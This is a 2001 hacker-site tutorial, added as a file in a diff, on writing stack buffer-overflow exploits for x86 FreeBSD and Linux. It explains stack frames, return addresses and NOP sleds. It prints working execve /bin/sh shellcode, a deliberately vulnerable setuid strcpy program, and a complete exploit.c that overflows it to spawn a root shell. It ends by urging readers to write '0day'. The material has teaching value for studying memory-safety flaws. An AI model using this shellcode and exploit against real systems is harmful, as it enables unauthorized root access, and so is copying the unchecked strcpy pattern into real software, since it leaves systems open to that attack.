@@ -1,0 +1,358 @@
+
+A guide to writing simple buffer-overflow exploits for x86 *nix.
+
+by fides [f1d3s@lineone.net]
+
+
+This guide intends to teach the basics of buffer overflow to the average C programmer
+without the need for complex knowledge of assembly.
+
+During this paper I will be using FreeBSD 4.2-Release to demonstrate procedures.
+
+
+
+1.  What is a buffer overflow?
+    ==========================
+
+
+A buffer overflow is a condition in a program whereby a function attempts to copy more
+data into a buffer than it can hold.  For example:
+
+char input[] = "aaaaaaaaaaa");
+char buffer[10];
+strcpy(buffer, input);
+
+This would cause a segmentation fault because we are copying 11 bytes into the buffer
+which can only hold 10.  The buffer has been overflowed.
+
+The 'safe' version of the above code would be:
+
+char input[] = "aaaaaaaaaaa");
+char buffer[10];
+strncpy(buffer, input, sizeof(buffer));
+
+This time it only copies the maximum amount of data that the buffer can handle, so the
+buffer can never be overflowed.  Unfortunately, not everybody is this careful when writing
+their code, and this is why there is so much vulnerable software these days.
+
+
+
+2.  So what happens to the extra byte(s)?
+    =====================================
+
+
+I could get into a lot of detail about the stack here, but I wanted to keep this paper
+simple so that the reader can build exploits without having a degree in x86 assembly.
+
+In memory, our buffer (of 10 bytes) looks like this:
+
+   buffer    sfp   ret
+[BBBBBBBBBB][xxxx][xxxx]
+
+This is part of a Stack Frame.  Basically, we have 10 bytes of buffer (actually 9 plus a NULL
+character to terminate it) then we have a four-byte Stack Frame Pointer and a four-byte Return -
+Address.
+
+When a function such as strcpy() is called, a stack frame is allocated for the buffer and
+the return address in this stack frame is set to the next instruction AFTER the strcpy() call.
+
+For example:
+
+strcpy(one, two);
+printf("String copied.\n");
+
+when strcpy() is called in this code, the return address is set to the address of the next
+instruction which will be the assembly equivalent of the printf() call.  This is so that
+when strcpy() has finished, the program returns execution at the return address set in the
+stack frame.
+
+So lets imagine what would happen if that return address were to somehow be changed.  Instead
+of returning back to just after the strcpy() call and continuing execution, the program
+would jump to the location in memory specified by the return address.  Lets assume the
+program is owned by root (uid 0) and it mode +s (setuid).  If the return address could be
+pointed to shellcode (code that will spawn a shell), the user running the program could
+get a root shell.  And *that* is what we are aiming for ;)
+
+So lets look at our Stack Frame in memory when we copy 18 bytes into it instead of the 10 that
+are allocated by the buffer.  In this example I will assume we strcpy()'d 18 character 'd's into
+the buffer.
+
+   buffer    sfp   ret
+[dddddddddd][dddd][dddd]
+
+In this example the return address is set to 0x64646464  (0x64 is the ascii value of 'd')
+
+So we can obviously set the return address to pretty much anything we want to really, except
+for the use of NULLs.  A string of data is always terminated by a NULL, so if we set the return
+address to something like 0x64006464, it would take the NULL as being the end of the string and
+the rest of the address would not be copied in.  This also applies to any data we decide to put
+into the buffer.
+
+
+3.  The Stack Pointer
+    =================
+
+
+Every program has a stack pointer which is the address of the beginning of the stack.  We can
+find the stack pointer for a system using the following code:
+
+
+unsigned long sp(void)
+{
+	__asm__("movl %esp, %eax");
+}
+
+void main(void)
+{
+	printf("0x%x\n", sp());
+}
+
+
+The function sp() contains the assembly instruction movl which copies the value of the stack
+pointer to the return buffer for the function, so it is returned to the main function and
+displayed.
+
+$ ./sp
+0xbfbffbc8
+$
+
+Ok, so we know our stack pointer is 0xbfbffbc8.  This means that if we write a program, any
+variables we declare will be allocated memory just after this address.  So with a little guesswork
+and some luck, we can find the address of a buffer in memory.
+
+
+4.  Shellcode
+    =========
+
+
+Shellcode is raw code in opcode format that will spawn a shell.  The normal and most common type
+of shellcode is a straight /bin/sh execve() call.  This code calls execve() to execute /bin/sh
+which obviously spawns a shell.  There are many papers on writing shellcode, so I won't go into
+any detail or attempt to teach you to write shellcode.
+
+The three things you *need* to know about shellcode are:
+
+ *  It must not contain any NULL characters.
+ *  It should generally be as small as possible.
+ *  It is os and architecture dependant.  So FreeBSD x86 shellcode will not work on a Sparc and
+    Linux shellcode will not work under *bsd.
+
+
+Example shellcode:
+
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
+\x89\xe3\x50\x53\x50\x54\x53\xb0\x3b\x50\xcd\x80
+
+
+This is shellcode for freebsd that execve()'s /bin/sh.
+
+We can test this code using the following program:
+
+char bsdshell[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+                  "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"
+                  "\xb0\x3b\x50\xcd\x80";
+
+int main() {
+	void (*s)()=(void *)bsdshell;   /* create a function pointing to the code */
+	s();
+}
+
+
+And as we can see, it works:
+
+fides@brotherhood:~$ gcc -o shell shell.c
+fides@brotherhood:~$ ./shell
+$ exit
+fides@brotherhood:~$
+
+
+For more examples of shellcode for various systems, visit http://darknet.evilgeeks.co.uk
+
+
+5.  Exploitation
+    ============
+
+
+We will now create a vulnerable program and attempt to exploit it.  Here is our vulnerable
+program:
+
+
+/* vulnerable.c */
+
+int main(int argc, char *argv[])
+{
+	char buffer[500];
+	if(argc>=2) strcpy(buffer, argv[1]);
+	return 0;
+}
+
+
+This will allocate a buffer of 500 bytes and copy into it whatever is given as the first
+command-line argument.  So we can pass it more than 500 bytes on the command line and overflow
+the buffer.
+
+To make this more real, we should set the program suid so that when run the user becomes root.
+
+$ gcc -o vulnerable vulnerable.c
+$ su
+Password:
+# chown 0 vulnerable
+# chmod 4755 vulnerable
+# exit
+$ ./vulnerable hi_there
+$
+
+Ok, all is good, the program copies its data and returns with no problem.  Now lets check that 501
+bytes is going to overflow it.
+
+
+/* overflow.c */
+
+void main()
+{
+	char buffer[501];
+	memset(&buffer, 'a', sizeof(buffer));
+	execl("./vulnerable", "vulnerable", buffer, 0);
+}
+
+
+$ gcc -o overflow overflow.c
+$ ./overflow
+Bus error
+$
+
+
+Ok so all is good.  Now we need to actually exploit this vulnerable program to spawn a root shell.
+
+We have a buffer of 500 bytes to play with, so we can put our shellcode somewhere in this, but we
+need to be able to jump to it in memory, therefore we must know (roughly) where it is.
+
+Remember what we said before, the stack pointer points to the beginning of the stack so the address
+of the buffer must be somewhere soon after it.
+
+But how do we know exactly where to jump?  The answer is we often don't, but the task of trial-and-
+error can be made a lot easier by the use of NOPs.
+
+A 'NOP' is instruction \x90 in assembly that simply does nothing for one tick and passes on to the
+next instruction.  NOPs are sometimes used in timing to create delays.
+
+How can the NOP be useful to us?  Well we have to jump to the start of our shellcode at its
+position in the buffer of the vulnerable program, but we don't know exactly where it is.  But what
+if the first 200 bytes of the buffer were NOPs just before the shellcode?  We could jump to any
+position in the bank of NOPs and the execution would just run through them in a few microseconds
+until it reached the shellcode which would then be executed.  In this way, we only need a very
+rough idea of where the buffer is, so we can get the stack pointer (using the function shown
+previously) and subtract an offset from it in increments of say 30 or 40 until we hit a NOP
+somewhere in the buffer.
+
+So we need to create our own buffer in the exploit code, of 600 bytes.  We fill it with the return
+address to make sure our ret address last on the register we want to overwrite.  The first half of the
+buffer we will with NOPs with the shellcode in the middle.
+
+We will take an argument from the command line to specify the offset from the stack pointer. (i.e.
+guess the address of a NOP in the buffer)
+
+
+/* exploit.c */
+
+#include <stdlib.h>
+
+#define BUFFERSIZE 600  /* vulnerable buffer + 100 bytes */
+
+/* shellcode for freebsd (*bsd?) */
+char bsdshell[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+                  "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"
+                  "\xb0\x3b\x50\xcd\x80";
+
+/* linux x86 shellcode */
+char lunixshell[] = "\xeb\x1d\x5e\x29\xc0\x88\x46\x07\x89\x46\x0c\x89\x76\x08\xb0"
+                    "\x0b\x87\xf3\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x29\xc0\x40\xcd"
+                    "\x80\xe8\xde\xff\xff\xff/bin/sh";
+
+unsigned long sp(void)
+{
+	__asm__("movl %esp, %eax");
+}
+
+void usage(char *cmd)
+{
+	printf("\nusage: %s <offset> <os>\n\n", cmd);
+	printf("OS types are:  1. FreeBSD (*bsd?)  2. Linux\n\n");
+	exit(-1);
+}
+
+int main(int argc, char *argv[])
+{
+	int i, offset, os;
+	long esp, ret, *addr_ptr;
+	char *buffer, *ptr, *osptr;
+
+	if(argc<3) usage(argv[0]);   /* quit if they didnt specify an offset */
+
+	offset = atoi(argv[1]);  /* get the offset they specified */
+	esp    = sp();           /* get the stack pointer */
+	ret    = esp-offset;     /* sp - offset = return address */
+	os     = atoi(argv[2]);  /* get os */
+
+	if(os<1 || os>2) usage(argv[0]);
+
+	printf("Stack pointer: 0x%x\n", esp);
+	printf("       Offset: 0x%x\n", offset);
+	printf("  Return addr: 0x%x\n", ret);
+
+	/* allocate memory for our buffer */
+	if(!(buffer = malloc(BUFFERSIZE))) {
+		printf("Couldn't allocate memory.\n");
+		exit(-1);
+	}
+
+	/* fill buffer with ret addr's */
+	ptr = buffer;
+	addr_ptr = (long *)ptr;
+	for(i=0; i<BUFFERSIZE; i+=4)
+		*(addr_ptr++) = ret;
+
+	/* fill first half of buffer with NOPs */
+	for(i=0; i<BUFFERSIZE/2; i++)
+		buffer[i] = '\x90';
+
+	/* insert shellcode in the middle */
+	if(os == 1) {
+		ptr = buffer + ((BUFFERSIZE/2) - (strlen(bsdshell)/2));
+		for(i=0; i<strlen(bsdshell); i++)
+			*(ptr++) = bsdshell[i];
+	} else {
+		ptr = buffer + ((BUFFERSIZE/2) - (strlen(lunixshell)/2));
+		for(i=0; i<strlen(lunixshell); i++)
+			*(ptr++) = lunixshell[i];
+	}
+
+	/* call the vulnerable program passing our exploit buffer as the argument */
+
+	buffer[BUFFERSIZE-1] = 0;
+	execl("./vulnerable", "vulnerable", buffer, 0);
+
+	return 0;
+}
+
+
+Now we can test our exploit:
+
+$ ./exploit 0 1
+Stack pointer: 0xbfbffb90
+       Offset: 0x0
+  Return addr: 0xbfbffb90
+#
+
+
+Here 0-221 works for the offset because the buffer we are overflowing is the very first variable
+declared in vulnerable.c, so it is right at the beginning of the program's stack. (note your os may
+be slightly different)
+
+
+That's it!  Now you can run off and code some m4d 0d4y :p
+
+
+--fides
+
+/*                   www.hack.co.za  [22 march 2001]*/
